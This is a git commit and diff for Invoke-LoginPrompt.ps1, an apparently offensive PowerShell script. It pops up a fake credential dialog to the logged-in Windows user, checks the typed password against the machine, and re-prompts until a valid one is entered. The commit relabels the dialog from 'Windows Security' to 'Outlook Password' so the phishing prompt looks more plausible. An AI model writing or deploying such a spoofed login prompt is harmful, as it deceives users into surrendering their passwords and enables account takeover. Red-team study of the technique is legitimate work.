fe6a40d3e96b14c623480da29a969f2512f65218
surbo <trentlo@gmail.com>
2015-01-28 08:07:13 -0600

    Update Invoke-LoginPrompt.ps1
    Changed Security Prompt

--- Invoke-LoginPrompt.ps1
+++ Invoke-LoginPrompt.ps1
@@ -2,7 +2,7 @@
 #Twitter: @enigma0x3
 #Blog: www.enigma0x3.wordpress.com
 function Invoke-LoginPrompt{
-$cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
+$cred = $Host.ui.PromptForCredential("Outlook Password", "Please enter user credentials", "$env:userdomain\$env:username","")
 $username = "$env:username"
 $domain = "$env:userdomain"
 $full = "$domain" + "\" + "$username"
@@ -11,7 +11,7 @@ Add-Type -assemblyname System.DirectoryServices.AccountManagement
 $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
 $DS.ValidateCredentials("$full", "$password") | out-null
 if($DS.ValidateCredentials -ne "True"){
-    $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
+    $cred = $Host.ui.PromptForCredential("Outlook Password", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
     $username = "$env:username"
     $domain = "$env:userdomain"
     $full = "$domain" + "\" + "$username"
